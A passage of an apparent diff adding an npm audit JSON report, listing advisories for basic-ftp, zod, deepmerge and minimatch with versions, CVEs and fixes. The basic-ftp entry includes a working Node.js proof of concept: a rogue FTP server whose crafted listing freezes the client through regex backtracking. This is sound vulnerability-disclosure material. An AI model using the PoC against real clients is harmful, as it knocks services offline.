else if (cmd.startsWith(\"PASS\")) c.write(\"230 .\\r\\n\");\n      else if (cmd.startsWith(\"FEAT\")) c.write(\"211-x\\r\\n UTF8\\r\\n211 End\\r\\n\");\n      else if (cmd.startsWith(\"EPSV\")) { const ds = net.createServer(s => { s.write(listing); s.end(); });\n        ds.listen(0, \"127.0.0.1\", () => c.write(`229 (|||${ds.address().port}|)\\r\\n`)); }\n      else if (cmd.startsWith(\"LIST\")) { c.write(\"150 .\\r\\n\"); setTimeout(() => c.write(\"226 .\\r\\n\"), 50); }\n      else c.write(\"200 .\\r\\n\"); } });\n});\nserver.listen(0, \"127.0.0.1\", async () => {\n  const client = new ftp.Client(0);\n  await client.access({ host: \"127.0.0.1\", port: server.address().port, user: \"x\", password: \"y\" });\n  let beats = 0; const hb = setInterval(() => beats++, 1000); const t = Date.now();\n  await client.list(); clearInterval(hb);\n  console.log(`list() blocked ${(Date.now() - t) / 1000}s; heartbeats fired: ${beats}`);\n  process.exit(0);\n});\n```\n\nPrints `list() blocked 39.75s; heartbeats fired: 0`, versus ~0.06s for a normal listing. The event loop is frozen the whole time. Cost is quadratic: 32 KB \u2248 2.4s, 64 KB \u2248 9.6s, 128 KB \u2248 39s. `maxListingBytes` defaults to 40 MB, so a single line can be far larger, and ~1 MB already blocks for tens of minutes.\n\n## Impact\n\nOne directory listing freezes the whole process, under default options, through the primary API. This is the same \"malicious FTP server causes client-side denial of service\" shape as GHSA-rp42-5vxx-qpwr, also in `Client.list()` and rated high. The byte cap added there bounds memory, not the parser's CPU cost.",
+   "reported_by": null,
+   "title": "basic-ftp: Quadratic-time CPU denial of service in Client.list() Unix directory-listing parser (RE_LINE backtracking)",
+   "metadata": null,
+   "cves": [
+    "CVE-2026-102990"
+   ],
+   "access": "public",
+   "severity": "high",
+   "module_name": "basic-ftp",
+   "vulnerable_versions": "<=6.2.0",
+   "github_advisory_id": "GHSA-c475-qrg2-pj4r",
+   "recommendation": "Upgrade to version 6.2.1 or later",
+   "patched_versions": ">=6.2.1",
+   "updated": "2026-10-01T14:42:45.000Z",
+   "cvss": {
+    "score": 0,
+    "vectorString": null
+   },
+   "cwe": [
+    "CWE-1333"
+   ],
+   "url": "https://github.com/advisories/GHSA-c475-qrg2-pj4r"
+  },
+  "1243066": {
+   "findings": [
+    {
+     "version": "3.25.76",
+     "paths": [
+      ".>@lhci/cli>lighthouse>puppeteer-core>chromium-bidi>zod"
+     ]
+    }
+   ],
+   "found_by": null,
+   "deleted": null,
+   "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-54404\n- https://github.com/colinhacks/zod/issues/1872\n- https://github.com/colinhacks/zod/pull/6475\n- https://www.vulncheck.com/advisories/zod-uncontrolled-resource-consumption-via-array-validation\n- https://github.com/colinhacks/zod/pull/6652\n- https://github.com/colinhacks/zod/commit/a0ebf970f2d752e5f58527cd2942ff48be4f46bd\n- https://github.com/advisories/GHSA-mrhx-c7xc-m3w5",
+   "created": "2026-10-01T18:32:46.000Z",
+   "id": 1243066,
+   "npm_advisory_id": null,
+   "overview": "Zod schema-validation library through 4.6.5 contains an uncontrolled resource consumption vulnerability that allows attackers to exhaust memory by submitting a large array to an application using an array schema without a length constraint. Attackers can exploit the handleArrayResult parse logic in $ZodArray, which accumulates every validation issue for each failing element with no cap or early termination, causing the process to allocate excessive issue objects and crash due to out-of-memory conditions.",
+   "reported_by": null,
+   "title": "Zod can exhaust memory while validating oversized constrained collections",
+   "metadata": null,
+   "cves": [
+    "CVE-2023-54404"
+   ],
+   "access": "public",
+   "severity": "high",
+   "module_name": "zod",
+   "vulnerable_versions": "<4.6.6",
+   "github_advisory_id": "GHSA-mrhx-c7xc-m3w5",
+   "recommendation": "Upgrade to version 4.6.6 or later",
+   "patched_versions": ">=4.6.6",
+   "updated": "2026-10-23T18:26:52.000Z",
+   "cvss": {
+    "score": 7.5,
+    "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+   },
+   "cwe": [
+    "CWE-770"
+   ],
+   "url": "https://github.com/advisories/GHSA-mrhx-c7xc-m3w5"
+  },
+  "1243505": {
+   "findings": [
+    {
+     "version": "4.3.1",
+     "paths": [
+      "apps__web>@astrojs/svelte>@sveltejs/vite-plugin-svelte>deepmerge"
+     ]
+    }
+   ],
+   "found_by": null,
+   "deleted": null,
+   "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-93753\n- https://github.com/TehShrike/deepmerge/issues/273\n- https://github.com/TehShrike/deepmerge/blob/5b87756a5671635679001cbac72aa42f23472c81/index.js#L39-L60\n- https://www.vulncheck.com/advisories/deepmerge-through-4.3.1-prototype-poisoning-via-mergeobject\n- https://github.com/advisories/GHSA-gcqx-w48m-w2h4",
+   "created": "2026-09-18T18:31:44.000Z",
+   "id": 1243505,
+   "npm_advisory_id": null,
+   "overview": "deepmerge through 4.3.1 contains a prototype poisoning vulnerability in the mergeObject() function that fails to properly validate keys being written to target objects. Attackers can supply malicious source objects in merge operations to inject attacker-controlled properties into the returned object's prototype, causing applications to inherit unintended values when accessing properties without own-property checks.",
+   "reported_by": null,
+   "title": "deepmerge mergeObject() allows prototype poisoning of returned objects",
+   "metadata": null,
+   "cves": [
+    "CVE-2026-93753"
+   ],
+   "access": "public",
+   "severity": "low",
+   "module_name": "deepmerge",
+   "vulnerable_versions": ">=4.2.0 <=4.3.1",
+   "github_advisory_id": "GHSA-gcqx-w48m-w2h4",
+   "recommendation": "None",
+   "patched_versions": "<0.0.0",
+   "updated": "2026-10-27T21:34:58.000Z",
+   "cvss": {
+    "score": 5.3,
+    "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+   },
+   "cwe": [
+    "CWE-1321"
+   ],
+   "url": "https://github.com/advisories/GHSA-gcqx-w48m-w2h4"
+  },
+  "1244012": {
+   "findings": [
+    {
+     "version": "3.1.5",
+     "paths": [
+      ".>@lhci/cli>chrome-launcher>rimraf>glob>minimatch"
+     ]
+    }
+   ],
+   "found_by": null,
+   "deleted": null,
+   "references": "- https://github.com/isaacs/minimatch/security/advisories/GHSA-g3hv-75wg-m249\n- https://nvd.nist.gov/vuln/detail/CVE-2026-118764\n- https://github.com/isaacs/minimatch/commit/77a0f5c4b80bdc641c3c930a1d9edf5ad2db57f8\n- https://github.com/isaacs/minimatch/releases/tag/v11.0.1\n- https://github.com/advisories/GHSA-g3hv-75wg-m249",
+   "created": "2026-10-30T23:09:55.000Z",
+   "id": 1244012,
+   "npm_advisory_id": null,
+   "overview": "minimatch 10.2.6 contains an attacker-controlled pattern amplification in firstPhasePreProcess() when optimizationLevel >= 2.\n\nresearcher: Reid Downing (b1nv0id)\nfiles: \n\n- src/index.ts: 690-770\n- src/index.ts: 780-796\n\nissue:\ninput-controlled growth of globParts during first-phase preprocessing, followed by quadratic second-phase processing.\n\nthe **/../ transformation clones a globparts entry and appends the clone to the same globparts array:\n```\nparts.splice(gs, 1)\nconst other = parts.slice(0)\nother[gs] = '**'\nglobParts.push(other)\n```\nthis occurs inside a do...while (didSomething) fixpoint loop, allowing generated entries to be processed again.\n\nthe expanded globparts array is subsequently processed by secondPhasePreProcess(), which performs pairwise comparisons:\n```\nfor (let i = 0; i < globParts.length - 1; i++) {\n  for (let j = i + 1; j < globParts.length; j++) {\n    this.partsMatch(...)\n  }\n}\n```\nan attacker who can supply a glob pattern can therefore cause additional pattern entries to be generated during preprocessing, followed by quadratic pairwise processing, resulting in excessive cpu and memory consumption.",
+   "reported_by": null,
+   "title": "minimatch has potential denial of service via globparts amplification",
+   "metadata": null,
+   "cves": [
+    "CVE-2026-118764"
+   ],
+   "access": "public",
+   "severity": "moderate",
+   "module_name": "minimatch",
+   "vulnerable_versions": "<11.0.1",
+   "github_advisory_id": "GHSA-g3hv-75wg-m249",
+   "recommendation": "Upgrade to version 11.0.1 or later",
+   "patched_versions": ">=11.0.1",
+   "updated": "2026-10-30T23:09:56.000Z",
+   "cvss": {
+    "score": 0,
+    "vectorString": null
+   },
+   "cwe": [
+    "CWE-405"
+   ],
+   "url": "https://github.com/advisories/GHSA-g3hv-75wg-m249"
+  }
+ },
+ "muted": [],
+ "metadata": {
+  "vulnerabilities": {
+   "info": 0,
+   "low": 3,
+   "moderate": 2,
+   "high": 6,
+   "critical": 0
+  },
+  "dependencies": 692,
+  "devDependencies": 0,
+  "optionalDependencies": 0,
+  "totalDependencies": 692
+ }
+}
